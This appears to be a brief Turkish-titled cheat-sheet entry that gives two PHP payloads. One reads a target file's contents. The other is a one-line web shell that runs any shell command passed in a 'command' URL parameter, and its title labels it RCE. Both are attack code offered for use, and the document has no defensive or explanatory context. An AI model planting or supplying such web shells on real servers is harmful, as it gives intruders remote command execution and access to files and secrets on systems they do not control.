
```php title:"dosyayı okumak için"
<?php echo file_get_contents('/path/to/target/file'); ?>
```

```php title:'RCE => /example/exp.php?command=id'
<?php echo system($_GET['command']); ?>
```

